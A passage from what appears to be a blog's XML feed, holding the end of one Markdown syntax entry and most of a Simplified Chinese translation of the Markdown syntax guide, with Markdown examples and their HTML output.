blockquote.&lt;/p&gt;&lt;p&gt;This is the second paragraph in the blockquote.&lt;/p&gt;&lt;h2&gt;This is an H2 in a blockquote&lt;/h2&gt;&lt;/blockquote&gt;</code></pre><h3 id="修辞和强调"><a href="#修辞和强调" class="headerlink" title="修辞和强调"></a>修辞和强调</h3><p>Markdown 使用星号和底线来标记需要强调的区段。</p><p>Markdown 语法:</p><pre><code>Some of these words *are emphasized*.Some of these words _are emphasized also_.Use two asterisks for **strong emphasis**.Or, if you prefer, __use two underscores instead__.</code></pre><p>输出 HTML 为:</p><pre><code>&lt;p&gt;Some of these words &lt;em&gt;are emphasized&lt;/em&gt;.Some of these words &lt;em&gt;are emphasized also&lt;/em&gt;.&lt;/p&gt;&lt;p&gt;Use two asterisks for &lt;strong&gt;strong emphasis&lt;/strong&gt;.Or, if you prefer, &lt;strong&gt;use two underscores instead&lt;/strong&gt;.&lt;/p&gt;</code></pre><h2 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h2><p>无序列表使用星号、加号和减号来做为列表的项目标记，这些符号是都可以使用的，使用星号：</p><pre><code>* Candy.* Gum.* Booze.</code></pre><p>加号：</p><pre><code>+ Candy.+ Gum.+ Booze.</code></pre><p>和减号</p><pre><code>- Candy.- Gum.- Booze.</code></pre><p>都会输出 HTML 为：</p><pre><code>&lt;ul&gt;&lt;li&gt;Candy.&lt;/li&gt;&lt;li&gt;Gum.&lt;/li&gt;&lt;li&gt;Booze.&lt;/li&gt;&lt;/ul&gt;</code></pre><p>有序的列表则是使用一般的数字接着一个英文句点作为项目标记：</p><pre><code>1. Red2. Green3. Blue</code></pre><p>输出 HTML 为：</p><pre><code>&lt;ol&gt;&lt;li&gt;Red&lt;/li&gt;&lt;li&gt;Green&lt;/li&gt;&lt;li&gt;Blue&lt;/li&gt;&lt;/ol&gt;</code></pre><p>如果你在项目之间插入空行，那项目的内容会用 <code>&lt;p&gt;</code> 包起来，你也可以在一个项目内放上多个段落，只要在它前面缩排 4 个空白或 1 个 tab 。</p><pre><code>* A list item.With multiple paragraphs.* Another item in the list.</code></pre><p>输出 HTML 为：</p><pre><code>&lt;ul&gt;&lt;li&gt;&lt;p&gt;A list item.&lt;/p&gt;&lt;p&gt;With multiple paragraphs.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Another item in the list.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><h3 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h3><p>Markdown 支援两种形式的链接语法： <em>行内</em> 和 <em>参考</em> 两种形式，两种都是使用角括号来把文字转成连结。</p><p>行内形式是直接在后面用括号直接接上链接：</p><pre><code>This is an [example link](http://example.com/).</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;This is an &lt;a href=&quot;http://example.com/&quot;&gt;example link&lt;/a&gt;.&lt;/p&gt;</code></pre><p>你也可以选择性的加上 title 属性：</p><pre><code>This is an [example link](http://example.com/ &quot;With a Title&quot;).</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;This is an &lt;a href=&quot;http://example.com/&quot; title=&quot;With a Title&quot;&gt;example link&lt;/a&gt;.&lt;/p&gt;</code></pre><p>参考形式的链接让你可以为链接定一个名称，之后你可以在文件的其他地方定义该链接的内容：</p><pre><code>I get 10 times more traffic from [Google][1] than from[Yahoo][2] or [MSN][3].[1]: http://google.com/ &quot;Google&quot;[2]: http://search.yahoo.com/ &quot;Yahoo Search&quot;[3]: http://search.msn.com/ &quot;MSN Search&quot;</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;I get 10 times more traffic from &lt;a href=&quot;http://google.com/&quot;title=&quot;Google&quot;&gt;Google&lt;/a&gt; than from &lt;a href=&quot;http://search.yahoo.com/&quot;title=&quot;Yahoo Search&quot;&gt;Yahoo&lt;/a&gt; or &lt;a href=&quot;http://search.msn.com/&quot;title=&quot;MSN Search&quot;&gt;MSN&lt;/a&gt;.&lt;/p&gt;</code></pre><p>title 属性是选择性的，链接名称可以用字母、数字和空格，但是不分大小写：</p><pre><code>I start my morning with a cup of coffee and[The New York Times][NY Times].[ny times]: http://www.nytimes.com/</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;I start my morning with a cup of coffee and&lt;a href=&quot;http://www.nytimes.com/&quot;&gt;The New York Times&lt;/a&gt;.&lt;/p&gt;</code></pre><h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><p>图片的语法和链接很像。</p><p>行内形式（title 是选择性的）：</p><pre><code>![alt text](/path/to/img.jpg &quot;Title&quot;)</code></pre><p>参考形式：</p><pre><code>![alt text][id][id]: /path/to/img.jpg &quot;Title&quot;</code></pre><p>上面两种方法都会输出 HTML 为：</p><pre><code>&lt;img src=&quot;/path/to/img.jpg&quot; alt=&quot;alt text&quot; title=&quot;Title&quot; /&gt;</code></pre><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>在一般的段落文字中，你可以使用反引号 <code>`</code> 来标记代码区段，区段内的 <code>&amp;</code>、<code>&lt;</code> 和 <code>&gt;</code> 都会被自动的转换成 HTML 实体，这项特性让你可以很容易的在代码区段内插入 HTML 码：</p><pre><code>I strongly recommend against using any `&lt;blink&gt;` tags.I wish SmartyPants used named entities like `&amp;mdash;`instead of decimal-encoded entites like `&amp;#8212;`.</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;I strongly recommend against using any&lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;&lt;p&gt;I wish SmartyPants used named entities like&lt;code&gt;&amp;amp;mdash;&lt;/code&gt; instead of decimal-encodedentites like &lt;code&gt;&amp;amp;#8212;&lt;/code&gt;.&lt;/p&gt;</code></pre><p>如果要建立一个已经格式化好的代码区块，只要每行都缩进 4 个空格或是一个 tab 就可以了，而 <code>&amp;</code>、<code>&lt;</code> 和 <code>&gt;</code> 也一样会自动转成 HTML 实体。</p><p>Markdown 语法:</p><pre><code>If you want your page to validate under XHTML 1.0 Strict,you&#39;ve got to put paragraph tags in your blockquotes:&lt;blockquote&gt;&lt;p&gt;For example.&lt;/p&gt;&lt;/blockquote&gt;</code></pre><p>输出 HTML 为：</p><pre><code>&lt;p&gt;If you want your page to validate under XHTML 1.0 Strict,you&#39;ve got to put paragraph tags in your blockquotes:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;blockquote&amp;gt;&amp;lt;p&amp;gt;For example.&amp;lt;/p&amp;gt;&amp;lt;/blockquote&amp;gt;&lt;/code&gt;&lt;/pre&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown 语法 (简体中文版)</title>
      <link href="/2012/03/30/Markdown%20%E8%AF%AD%E6%B3%95%20(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%E7%89%88)/"/>
      <url>/2012/03/30/Markdown%20%E8%AF%AD%E6%B3%95%20(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%E7%89%88)/</url>
      
        <content type="html"><![CDATA[<p><strong>NOTE:</strong> This is Simplelified  Chinese Edition Document of Markdown Syntax. If you are seeking for English Edition Document. Please refer to <a href="http://daringfireball.net/projects/markdown/syntax">Markdown: Syntax</a>.</p><p><strong>声明：</strong> 这份文档派生(fork)于<a href="http://markdown.tw/">繁体中文版</a>，在此基础上进行了繁体转简体工作，并进行了适当的润色。此文档用 Markdown 语法编写，你可以到这里<a href="http://gitcafe.com/riku/Markdown-Syntax-CN/blob/master/syntax.md">查看它的源文件</a>。「繁体中文版的原始文件可以<a href="https://github.com/othree/markdown-syntax-zhtw/blob/master/syntax.md">查看这里</a> 。」–By @<a href="http://twitter.com/riku">riku</a> &#x2F; 本项目托管于 <a href="http://gitcafe.com/riku/Markdown-Syntax-CN">GitCafe</a></p><p><strong>注：</strong> 本项目同时也托管于 <a href="https://github.com/riku/Markdown-Syntax-CN">Github</a> 上，请通过 fork＋pull request 方式来帮忙改进本项目。</p><h1 id="Markdown-语法说明-简体中文版-x2F-点击查看快速入门"><a href="#Markdown-语法说明-简体中文版-x2F-点击查看快速入门" class="headerlink" title="Markdown 语法说明 (简体中文版) &#x2F; (点击查看快速入门)"></a>Markdown 语法说明 (简体中文版) &#x2F; (<a href="../markdown-basics">点击查看快速入门</a>)</h1><ul><li><a href="#overview">概述</a><ul><li><a href="#philosophy">宗旨</a></li><li><a href="#html">兼容 HTML</a></li><li><a href="#autoescape">特殊字符自动转换</a></li></ul></li><li><a href="#block">区块元素</a><ul><li><a href="#p">段落和换行</a></li><li><a href="#header">标题</a></li><li><a href="#blockquote">区块引用</a></li><li><a href="#list">列表</a></li><li><a href="#precode">代码区块</a></li><li><a href="#hr">分隔线</a></li></ul></li><li><a href="#span">区段元素</a><ul><li><a href="#link">链接</a></li><li><a href="#em">强调</a></li><li><a href="#code">代码</a></li><li><a href="#img">图片</a></li></ul></li><li><a href="#misc">其它</a><ul><li><a href="#backslash">反斜杠</a></li><li><a href="#autolink">自动链接</a></li></ul></li><li><a href="#acknowledgement">感谢</a></li></ul><hr><h2 id="overview">概述</h2><h3 id="philosophy">宗旨</h3><p>Markdown 的目标是实现「易读易写」。</p><p>可读性，无论如何，都是最重要的。一份使用 Markdown 格式撰写的文件应该可以直接以纯文本发布，并且看起来不会像是由许多标签或是格式指令所构成。Markdown 语法受到一些既有 text-to-HTML 格式的影响，包括 [Setext] <a href="http://docutils.sourceforge.net/mirror/setext.html">1</a>、[atx] <a href="http://www.aaronsw.com/2002/atx/">2</a>、[Textile] <a href="http://textism.com/tools/textile/">3</a>、[reStructuredText] <a href="http://docutils.sourceforge.net/rst.html">4</a>、[Grutatext] <a href="http://www.triptico.com/software/grutatxt.html">5</a> 和 [EtText] <a href="http://ettext.taint.org/doc/">6</a>，而最大灵感来源其实是纯文本电子邮件的格式。</p><p>总之， Markdown 的语法全由一些符号所组成，这些符号经过精挑细选，其作用一目了然。比如：在文字两旁加上星号，看起来就像*强调*。Markdown 的列表看起来，嗯，就是列表。Markdown 的区块引用看起来就真的像是引用一段文字，就像你曾在电子邮件中见过的那样。</p><h3 id="html">兼容 HTML</h3><p>Markdown 语法的目标是：成为一种适用于网络的<em>书写</em>语言。</p><p>Markdown 不是想要取代 HTML，甚至也没有要和它相近，它的语法种类很少，只对应 HTML 标记的一小部分。Markdown 的构想<em>不是</em>要使得 HTML 文档更容易书写。在我看来， HTML 已经很容易写了。Markdown 的理念是，能让文档更容易读、写和随意改。HTML 是一种<em>发布</em>的格式，Markdown 是一种<em>书写</em>的格式。就这样，Markdown 的格式语法只涵盖纯文本可以涵盖的范围。</p><p>不在 Markdown 涵盖范围之内的标签，都可以直接在文档里面用 HTML 撰写。不需要额外标注这是 HTML 或是 Markdown；只要直接加标签就可以了。</p><p>要制约的只有一些 HTML 区块元素――比如 <code>&lt;div&gt;</code>、<code>&lt;table&gt;</code>、<code>&lt;pre&gt;</code>、<code>&lt;p&gt;</code> 等标签，必须在前后加上空行与其它内容区隔开，还要求它们的开始标签与结尾标签不能用制表符或空格来缩进。Markdown 的生成器有足够智能，不会在 HTML 区块标签外加上不必要的 <code>&lt;p&gt;</code> 标签。</p><p>例子如下，在 Markdown 文件里加上一段 HTML 表格：</p><pre><code>这是一个普通段落。&lt;table&gt;    &lt;tr&gt;        &lt;td&gt;Foo&lt;/td&gt;    &lt;/tr&gt;&lt;/table&gt;这是另一个普通段落。</code></pre><p>请注意，在 HTML 区块标签间的 Markdown 格式语法将不会被处理。比如，你在 HTML 区块内使用 Markdown 样式的<code>*强调*</code>会没有效果。</p><p>HTML 的区段（行内）标签如 <code>&lt;span&gt;</code>、<code>&lt;cite&gt;</code>、<code>&lt;del&gt;</code> 可以在 Markdown 的段落、列表或是标题里随意使用。依照个人习惯，甚至可以不用 Markdown 格式，而直接采用 HTML 标签来格式化。举例说明：如果比较喜欢 HTML 的 <code>&lt;a&gt;</code> 或 <code>&lt;img&gt;</code> 标签，可以直接使用这些标签，而不用 Markdown 提供的链接或是图像标签语法。</p><p>和处在 HTML 区块标签间不同，Markdown 语法在 HTML 区段标签间是有效的。</p><h3 id="autoescape">特殊字符自动转换</h3><p>在 HTML 文件中，有两个字符需要特殊处理： <code>&lt;</code> 和 <code>&amp;</code> 。 <code>&lt;</code> 符号用于起始标签，<code>&amp;</code> 符号则用于标记 HTML 实体，如果你只是想要显示这些字符的原型，你必须要使用实体的形式，像是 <code>&amp;lt;</code> 和 <code>&amp;amp;</code>。</p><p><code>&amp;</code> 字符尤其让网络文档编写者受折磨，如果你要打「<code>AT&amp;T</code>」 ，你必须要写成「<code>AT&amp;amp;T</code>」。而网址中的 <code>&amp;</code> 字符也要转换。比如你要链接到：</p><pre><code>http://images.google.com/images?num=30&amp;q=larry+bird</code></pre><p>你必须要把网址转换写为：</p><pre><code>http://images.google.com/images?num=30&amp;amp;q=larry+bird</code></pre><p>才能放到链接标签的 <code>href</code> 属性里。不用说也知道这很容易忽略，这也可能是 HTML 标准检验所检查到的错误中，数量最多的。</p><p>Markdown 让你可以自然地书写字符，需要转换的由它来处理好了。如果你使用的 <code>&amp;</code> 字符是 HTML 字符实体的一部分，它会保留原状，否则它会被转换成 <code>&amp;amp</code>;。</p><p>所以你如果要在文档中插入一个版权符号 <code>©</code>，你可以这样写：</p><pre><code>&amp;copy;</code></pre><p>Markdown 会保留它不动。而若你写：</p><pre><code>AT&amp;T</code></pre><p>Markdown 就会将它转为：</p><pre><code>AT&amp;amp;T</code></pre><p>类似的状况也会发生在 <code>&lt;</code> 符号上，因为 Markdown 允许 <a href="#html">兼容 HTML</a> ，如果你是把 <code>&lt;</code> 符号作为 HTML 标签的定界符使用，那 Markdown 也不会对它做任何转换，但是如果你写：</p><pre><code>4 &lt; 5</code></pre><p>Markdown 将会把它转换为：</p><pre><code>4 &amp;lt; 5</code></pre><p>不过需要注意的是，code 范围内，不论是行内还是区块， <code>&lt;</code> 和 <code>&amp;</code> 两个符号都<em>一定</em>会被转换成 HTML 实体，这项特性让你可以很容易地用 Markdown 写 HTML code （和 HTML 相对而言， HTML 语法中，你要把所有的 <code>&lt;</code> 和 <code>&amp;</code> 都转换为 HTML 实体，才能在 HTML 文件里面写出 HTML code。）</p><hr><h2 id="block">区块元素</h2><h3 id="p">段落和换行</h3><p>一个 Markdown 段落是由一个或多个连续的文本行组成，它的前后要有一个以上的空行（空行的定义是显示上看起来像是空的，便会被视为空行。比方说，若某一行只包含空格和制表符，则该行也会被视为空行）。普通段落不该用空格或制表符来缩进。</p><p>「由一个或多个连续的文本行组成」这句话其实暗示了 Markdown 允许段落内的强迫换行（插入换行符），这个特性和其他大部分的 text-to-HTML 格式不一样（包括 Movable Type 的「Convert Line Breaks」选项），其它的格式会把每个换行符都转成 <code>&lt;br /&gt;</code> 标签。</p><p>如果你<em>确实</em>想要依赖 Markdown 来插入 <code>&lt;br /&gt;</code> 标签的话，在插入处先按入两个以上的空格然后回车。</p><p>的确，需要多费点事（多加空格）来产生 <code>&lt;br /&gt;</code> ，但是简单地「每个换行都转换为 <code>&lt;br /&gt;</code>」的方法在 Markdown 中并不适合， Markdown 中 email 式的 <a href="#blockquote">区块引用</a> 和多段落的 <a href="#list">列表</a> 在使用换行来排版的时候，不但更好用，还更方便阅读。</p><h3 id="header">标题</h3><p>Markdown 支持两种标题的语法，类 [Setext] <a href="http://docutils.sourceforge.net/mirror/setext.html">1</a> 和类 [atx] <a href="http://www.aaronsw.com/2002/atx/">2</a> 形式。</p><p>类 Setext 形式是用底线的形式，利用 <code>=</code> （最高阶标题）和 <code>-</code> （第二阶标题），例如：</p><pre><code>This is an H1=============This is an H2-------------</code></pre><p>任何数量的 <code>=</code> 和 <code>-</code> 都可以有效果。</p><p>类 Atx 形式则是在行首插入 1 到 6 个 <code>#</code> ，对应到标题 1 到 6 阶，例如：</p><pre><code># 这是 H1## 这是 H2###### 这是 H6</code></pre><p>你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 <code>#</code>，而行尾的 <code>#</code> 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：</p><pre><code># 这是 H1 ### 这是 H2 ##### 这是 H3 ######</code></pre><h3 id="blockquote">区块引用 Blockquotes</h3><p>Markdown 标记区块引用是使用类似 email 中用 <code>&gt;</code> 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,&gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.&gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; &gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse&gt; id sem consectetuer libero luctus adipiscing.</code></pre><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisseid sem consectetuer libero luctus adipiscing.</code></pre><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 <code>&gt;</code> ：</p><pre><code>&gt; This is the first level of quoting.&gt;&gt; &gt; This is nested blockquote.&gt;&gt; Back to the first level.</code></pre><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><pre><code>&gt; ## 这是一个标题。&gt; &gt; 1.   这是第一行列表项。&gt; 2.   这是第二行列表项。&gt; &gt; 给出一些例子代码：&gt; &gt;     return shell_exec(&quot;echo $input | $markdown_script&quot;);</code></pre><p>任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择<em>增加引用阶层</em>。</p><h3 id="list">列表</h3><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号、加号或是减号作为列表标记：</p><pre><code>*   Red*   Green*   Blue</code></pre><p>等同于：</p><pre><code>+   Red+   Green+   Blue</code></pre><p>也等同于：</p><pre><code>-   Red-   Green-   Blue</code></pre><p>有序列表则使用数字接着一个英文句点：</p><pre><code>1.  Bird2.  McHale3.  Parish</code></pre><p>很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：</p><pre><code>&lt;ol&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;McHale&lt;/li&gt;&lt;li&gt;Parish&lt;/li&gt;&lt;/ol&gt;</code></pre><p>如果你的列表标记写成：</p><pre><code>1.  Bird1.  McHale1.  Parish</code></pre><p>或甚至是：</p><pre><code>3. Bird1. McHale8. Parish</code></pre><p>你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。</p><p>如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,    viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.    Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>但是如果你懒，那也行：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 <code>&lt;p&gt;</code><br>标签包起来，举例来说：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;Magic&lt;/li&gt;&lt;/ul&gt;</code></pre><p>但是这个：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;&lt;p&gt;Bird&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Magic&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：</p><pre><code>1.  This is a list item with two paragraphs. Lorem ipsum dolor    sit amet, consectetuer adipiscing elit. Aliquam hendrerit    mi posuere lectus.    Vestibulum enim wisi, viverra nec, fringilla in, laoreet    vitae, risus. Donec sit amet nisl. Aliquam semper ipsum    sit amet velit.2.  Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><pre><code>*   This is a list item with two paragraphs.    This is the second paragraph in the list item. You&#39;reonly required to indent the first line. Lorem ipsum dolorsit amet, consectetuer adipiscing elit.*   Another item in the same list.</code></pre><p>如果要在列表项目内放进引用，那 <code>&gt;</code> 就需要缩进：</p><pre><code>*   A list item with a blockquote:    &gt; This is a blockquote    &gt; inside a list item.</code></pre><p>如果要放代码区块的话，该区块就需要缩进<em>两次</em>，也就是 8 个空格或是 2 个制表符：</p><pre><code>*   一列表项包含一个列表区块：        &lt;代码写在这&gt;</code></pre><p>当然，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>1986. What a great season.</code></pre><p>换句话说，也就是在行首出现<em>数字-句点-空白</em>，要避免这样的状况，你可以在句点前面加上反斜杠。</p><pre><code>1986\. What a great season.</code></pre><h3 id="precode">代码区块</h3><p>和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 <code>&lt;pre&gt;</code> 和 <code>&lt;code&gt;</code> 标签来把代码区块包起来。</p><p>要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：</p><pre><code>这是一个普通段落：    这是一个代码区块。</code></pre><p>Markdown 会转换成：</p><pre><code>&lt;p&gt;这是一个普通段落：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;这是一个代码区块。&lt;/code&gt;&lt;/pre&gt;</code></pre><p>这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：</p><pre><code>Here is an example of AppleScript:    tell application &quot;Foo&quot;        beep    end tell</code></pre><p>会被转换为：</p><pre><code>&lt;p&gt;Here is an example of AppleScript:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tell application &quot;Foo&quot;    beepend tell&lt;/code&gt;&lt;/pre&gt;</code></pre><p>一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。</p><p>在代码区块里面， <code>&amp;</code> 、 <code>&lt;</code> 和 <code>&gt;</code> 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：</p><pre><code>    &lt;div class=&quot;footer&quot;&gt;        &amp;copy; 2004 Foo Corporation    &lt;/div&gt;</code></pre><p>会被转换为：</p><pre><code>&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&quot;footer&quot;&amp;gt;    &amp;amp;copy; 2004 Foo Corporation&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;</code></pre><p>代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。</p><h3 id="hr">分隔线</h3><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><pre><code>* * *********- - ----------------------------------------</code></pre><hr><h2 id="span">区段元素</h2><h3 id="link">链接</h3><p>Markdown 支持两种形式的链接语法： <em>行内式</em>和<em>参考式</em>两种形式。</p><p>不管是哪一种，链接文字都是用 [方括号] 来标记。</p><p>要建立一个<em>行内式</em>的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：</p><pre><code>This is [an example](http://example.com/ &quot;Title&quot;) inline link.[This link](http://example.net/) has no title attribute.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;This is &lt;a href=&quot;http://example.com/&quot; title=&quot;Title&quot;&gt;an example&lt;/a&gt; inline link.&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://example.net/&quot;&gt;This link&lt;/a&gt; has notitle attribute.&lt;/p&gt;</code></pre><p>如果你是要链接到同样主机的资源，你可以使用相对路径：</p><pre><code>See my [About](/about/) page for details.   </code></pre><p><em>参考式</em>的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：</p><pre><code>This is [an example][id] reference-style link.</code></pre><p>你也可以选择性地在两个方括号中间加上一个空格：</p><pre><code>This is [an example] [id] reference-style link.</code></pre><p>接着，在文件的任意处，你可以把这个标记的链接内容定义出来：</p><pre><code>[id]: http://example.com/  &quot;Optional Title Here&quot;</code></pre><p>链接内容定义的形式为：</p><ul><li>方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字</li><li>接着一个冒号</li><li>接着一个以上的空格或制表符</li><li>接着链接的网址</li><li>选择性地接着 title 内容，可以用单引号、双引号或是括弧包着</li></ul><p>下面这三种链接的定义都是相同：</p><pre><code>[foo]: http://example.com/  &quot;Optional Title Here&quot;[foo]: http://example.com/  &#39;Optional Title Here&#39;[foo]: http://example.com/  (Optional Title Here)</code></pre><p><strong>请注意：</strong>有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。</p><p>链接网址也可以用方括号包起来：</p><pre><code>[id]: &lt;http://example.com/&gt;  &quot;Optional Title Here&quot;</code></pre><p>你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：</p><pre><code>[id]: http://example.com/longish/path/to/resource/here    &quot;Optional Title Here&quot;</code></pre><p>网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。</p><p>链接辨别标签可以有字母、数字、空白和标点符号，但是并<em>不</em>区分大小写，因此下面两个链接是一样的：</p><pre><code>[link text][a][link text][A]</code></pre><p><em>隐式链接标记</em>功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 “Google” 链接到 google.com，你可以简化成：</p><pre><code>[Google][]</code></pre><p>然后定义链接内容：</p><pre><code>[Google]: http://google.com/</code></pre><p>由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：</p><pre><code>Visit [Daring Fireball][] for more information.</code></pre><p>然后接着定义链接：</p><pre><code>[Daring Fireball]: http://daringfireball.net/</code></pre><p>链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。</p><p>下面是一个参考式链接的范例：</p><pre><code>I get 10 times more traffic from [Google] [1] than from[Yahoo] [2] or [MSN] [3].  [1]: http://google.com/        &quot;Google&quot;  [2]: http://search.yahoo.com/  &quot;Yahoo Search&quot;  [3]: http://search.msn.com/    &quot;MSN Search&quot;</code></pre><p>如果改成用链接名称的方式写：</p><pre><code>I get 10 times more traffic from [Google][] than from[Yahoo][] or [MSN][].  [google]: http://google.com/        &quot;Google&quot;  [yahoo]:  http://search.yahoo.com/  &quot;Yahoo Search&quot;  [msn]:    http://search.msn.com/    &quot;MSN Search&quot;</code></pre><p>上面两种写法都会产生下面的 HTML。</p><pre><code>&lt;p&gt;I get 10 times more traffic from &lt;a href=&quot;http://google.com/&quot;title=&quot;Google&quot;&gt;Google&lt;/a&gt; than from&lt;a href=&quot;http://search.yahoo.com/&quot; title=&quot;Yahoo Search&quot;&gt;Yahoo&lt;/a&gt;or &lt;a href=&quot;http://search.msn.com/&quot; title=&quot;MSN Search&quot;&gt;MSN&lt;/a&gt;.&lt;/p&gt;</code></pre><p>下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：</p><pre><code>I get 10 times more traffic from [Google](http://google.com/ &quot;Google&quot;)than from [Yahoo](http://search.yahoo.com/ &quot;Yahoo Search&quot;) or[MSN](http://search.msn.com/ &quot;MSN Search&quot;).</code></pre><p>参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。</p><p>使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。</p><h3 id="em">强调</h3><p>Markdown 使用星号（<code>*</code>）和底线（<code>_</code>）作为标记强调字词的符号，被 <code>*</code> 或 <code>_</code> 包围的字词会被转成用 <code>&lt;em&gt;</code> 标签包围，用两个 <code>*</code> 或 <code>_</code> 包起来的话，则会被转成 <code>&lt;strong&gt;</code>，例如：</p><pre><code>*single asterisks*_single underscores_**double asterisks**__double underscores__</code></pre><p>会转成：</p><pre><code>&lt;em&gt;single 